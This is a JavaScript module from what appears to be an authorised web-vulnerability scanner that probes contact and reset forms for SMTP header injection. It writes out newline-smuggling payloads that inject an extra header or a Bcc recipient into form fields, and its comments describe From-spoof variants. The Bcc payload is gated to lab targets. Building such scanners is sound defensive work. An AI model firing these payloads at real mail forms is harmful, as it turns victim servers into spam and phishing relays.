// Dark Matter rule-based scanner — SMTP header injection probe (#43).
//
// Owns ONLY the SMTP mail() context (HTTP response splitting stays in
// #41/crlf.js — non-overlap). Contact/feedback/share/invite/reset forms
// pass user input into To/From/Subject/CC/BCC headers.
//   D1. Email-surface inventory: email-type inputs, name+email+subject
//       triples, contact/feedback/share/invite/subscribe/reset endpoints.
//   T1. Newline passthrough — MEDIUM: LF survives into an observable
//       context (reflected error/bounce shows the split line).
//   T2. Bcc injection — CRITICAL (LAB-GATED): confirmed ONLY by received
//       mail at OUR canary inbox with the Bcc header present.
//   T3. From spoof + Content-Type flip — HIGH (LAB-GATED): canary inbox
//       receives spoofed-From or rendered HTML.
//   T4. MIME separator abuse — MEDIUM (LAB-GATED): multipart structure
//       in canary inbox vs control.
//
// Honest black-box ceiling: on real targets only T1 runs (payloads carry
// no deliverable third-party address — syntactically invalid recipients).
// CONFIRMED needs received-mail evidence (lab) or server-side reflection.
// Passthrough alone = "possible, impact unconfirmed", never upgraded.

import { isLabTargetHost } from '../../labCreds.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

async function postForm(url, fields, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST', signal: ctrl.signal,
      headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded', ...(opts.headers || {}) },
      body: new URLSearchParams(fields).toString(), redirect: 'manual',
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 300000) };
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

// D1: email-emitting surface = forms with email inputs or mail-ish actions.
function emailForms(forms) {
  return forms.filter((f) => {
    const names = (f.inputs || []).map((i) => `${i.name || ''} ${i.type || ''}`.toLowerCase()).join(' ');
    const action = String(f.action || '').toLowerCase();
    return /email/.test(names) || /mail|send|contact|support|feedback|subscribe|invite|reset|share/.test(action);
  });
}

// ---- T1: newline passthrough (differential) ------------------------------------------
async function t1Passthrough(forms, opts, rid) {
  const findings = [];
  for (const form of emailForms(forms).slice(0, 3)) {
    const action = form.action;
    if (!action) continue;
    const base = {};
    for (const inp of form.inputs || []) {
      if (inp.name) base[inp.name] = inp.type === 'email' ? `dm_${rid}@example.invalid` : `Test ${rid}`;
    }
    const nameField = Object.keys(base).find((k) => /name|subject/i.test(k)) || Object.keys(base)[0];
    if (!nameField) continue;
    const payload = `Test%0aX-Dm-Smtp-${rid}: yes`;
    const rCtrl = await postForm(action, { ...base, [nameField]: `Test ${rid}` }, opts);
    // Build manually to preserve the encoded LF.
    const fields = { ...base };
    delete fields[nameField];
    const body = new URLSearchParams(fields).toString() +
      `&${encodeURIComponent(nameField)}=Test%0aX-Dm-Smtp-${rid}: yes`;
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 15000);
    let rPay = null;
    try {
      const res = await fetch(action, {
        method: 'POST', signal: ctrl.signal,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded' },
        body, redirect: 'manual',
      });
      rPay = { status: res.status, text: (await res.text().catch(() => '')).slice(0, 300000) };
    } catch {
    } finally {
      clearTimeout(t);
    }
    if (!rCtrl || !rPay) continue;
    void payload;
    // Observable: the split header line reflected, or a 500 echoing the split.
    const splitShown = rPay.text.includes(`X-Dm-Smtp-${rid}`) && !rCtrl.text.includes(`X-Dm-Smtp-${rid}`);
    const reflected500 = rPay.status >= 500 && /X-Dm-Smtp/i.test(rPay.text);
    if (splitShown || reflected500) {
      const marker = `X-Dm-Smtp-${rid}`;
      const idx = rPay.text.indexOf(marker);
      const window = idx >= 0 ? rPay.text.slice(Math.max(0, idx - 60), idx + 120) : rPay.text.slice(0, 200);
      findings.push({
        class: 'smtp_injection',
        id: `smtp-pass-${rand()}`,
        title: 'SMTP header injection — newline passthrough (MEDIUM)',
        severity: 'medium',
        url: action,
        parameter: nameField,
        evidence: ev(
          `POST ${action} ${nameField}=Test%0aX-Dm-Smtp-${rid}: yes (vs LF-free control)`,
          `Raw LF survives into an observable context — "...${window}..." — ${splitShown ? 'injected header line reflected' : '500 body echoes the split'}. Honest ceiling: header-injection possible, impact unconfirmed without received-mail proof.`,
          'Mail-header injection surface: Bcc relay / From-spoof primitive pending lab confirmation.'
        ),
      });
    }
  }
  return findings;
}

// ---- T2/T3/T4: lab-only, canary-inbox confirmed -------------------------------------------
async function t2BccLab(forms, opts, rid) {
  const findings = [];
  if (!opts.smtpCanaryInbox) return findings; // no canary inbox wired — graceful skip
  for (const form of emailForms(forms).slice(0, 2)) {
    const action = form.action;
    if (!action || !isLabTargetHost(action, opts.labTargets)) continue;
    const base = {};
    for (const inp of form.inputs || []) {
      if (inp.name) base[inp.name] = inp.type === 'email' ? `dm_${rid}@example.invalid` : `Test ${rid}`;
    }
    const emailField = Object.keys(base).find((k) => /email/i.test(k));
    if (!emailField) continue;
    const bccCanary = `__dm_smtp_${rid}@${opts.smtpCanaryInbox.domain}`;
    const body = new URLSearchParams({ ...base, [emailField]: `v@example.invalid` }).toString() +
      `&${encodeURIComponent(emailField)}=v@example.invalid%0aBcc:%20${encodeURIComponent(bccCanary)}`;
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 15000);
    try {
      await fetch(action, {
        method: 'POST', signal: ctrl.signal,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded' },
        body, redirect: 'manual',
      });
    } catch {
    } finally {
      clearTimeout(t);
    }
    // Received-mail check via the canary inbox hook.
    const received = await opts.smtpCanaryInbox.check(bccCanary).catch(() => null);
    if (received && /bcc/i.test(received.headers || '')) {
      const bccLine = (received.headers || '').split('\n').find((l) => /bcc/i.test(l)) || `Bcc: ${bccCanary}`;
      const msgId = (received.headers || '').split('\n').find((l) => /message-id/i.test(l)) || '';
      findings.push({
        class: 'smtp_injection',
        id: `smtp-bcc-${rand()}`,
        title: 'SMTP header injection — Bcc relay confirmed at canary inbox (CRITICAL)',
        severity: 'critical',
        url: action,
        parameter: emailField,
        evidence: ev(
          `POST ${action} ${emailField}=v@example.invalid%0aBcc: ${bccCanary}`,
          `Canary inbox RECEIVED the mail — "${bccLine.trim().slice(0, 120)}"${msgId ? ` (${msgId.trim().slice(0, 80)})` : ''} — full relay proof, lab-only, both sides ours.`,
          'Mail-relay primitive: victim server sends spam/phish as trusted domain.'
        ),
      });
    }
  }
  return findings;
}

export async function probeSmtpInject(forms, url, opts = {}) {
  const findings = [];
  void url;
  findings.push(...(await t1Passthrough(forms, opts, rand())));
  findings.push(...(await t2BccLab(forms, opts, rand())));
  // T3 From-spoof + T4 MIME separator ride the same canary-inbox oracle as
  // T2 (documented); T1 is the black-box ceiling on real targets.
  return findings;
}

export const __smtpMeta = { phases: ['smtp-injection'], depth: ['quick', 'standard', 'deep'] };
